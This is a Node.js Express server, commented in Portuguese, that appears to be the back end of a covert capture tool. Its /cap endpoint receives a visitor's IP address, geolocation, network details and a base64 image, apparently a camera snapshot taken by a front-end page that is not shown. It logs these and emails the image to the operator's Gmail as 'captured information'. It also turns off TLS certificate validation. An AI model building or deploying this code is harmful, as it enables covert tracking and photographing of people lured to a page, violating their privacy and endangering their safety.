const express = require("express");
const nodemailer = require("nodemailer");
const requestIp = require("request-ip");

const app = express();
const PORT = 3000;

app.use(express.json({ limit: "10mb" }));
app.use(express.static("public"));

// Configuração do Nodemailer
const transporter = nodemailer.createTransport({
  service: "gmail", // Ou outro serviço de e-mail que você estiver usando
  auth: {
    user: process.env.EMAIL_USER, // Substitua pelo seu e-mail
    pass: process.env.EMAIL_PASS, // Substitua pela sua senha
  },
  tls: {
    rejectUnauthorized: false, // Adicione isso caso você tenha problemas com conexões TLS
  },
});

// Função para enviar e-mail
function sendEmail(ip, location, connection, imageBuffer) {
  const mailOptions = {
    from: process.env.EMAIL_USER, // Usando variável de ambiente
    to: process.env.EMAIL_USER, // Usando variável de ambiente
    subject: "Informações Capturadas - Endpoint /cap",
    text: `Informações Capturadas:
    IP: ${ip}`,
    attachments: [
      {
        filename: `${Date.now()}.png`, // Nome do arquivo
        content: imageBuffer, // Conteúdo do arquivo
        encoding: "base64", // Codificação para enviar como base64
      },
    ],
  };

  console.log("Enviando e-mail...");

  transporter.sendMail(mailOptions, (error, info) => {
    if (error) {
      console.log("Erro ao enviar e-mail:", error);
    } else {
      console.log("E-mail enviado:", info.response);
    }
  });
}

// Endpoint /cap
app.post("/cap", (req, res) => {
  const ip = requestIp.getClientIp(req); // Captura o IP real
  const { image, location, connection } = req.body;

  // Log IP
  console.log(`IP: ${ip}`);

  // Log localização se disponível
  if (location) {
    console.log(
      `Localização: Latitude ${location.latitude}, Longitude ${location.longitude}`
    );
  }

  // Log informações de conexão se disponíveis
  if (connection) {
    console.log(
      `Conexão: Tipo ${connection.effectiveType}, Downlink ${connection.downlink}, RTT ${connection.rtt}`
    );
  }

  // Converter imagem para buffer e enviar no e-mail
  if (image) {
    const imageBuffer = Buffer.from(image.split(",")[1], "base64");
    sendEmail(ip, location, connection, imageBuffer); // Envia a imagem como anexo
  }

  res.send({ status: "success", ip });
});

app.listen(PORT, () =>
  console.log(`Servidor rodando em http://localhost:${PORT}`)
);
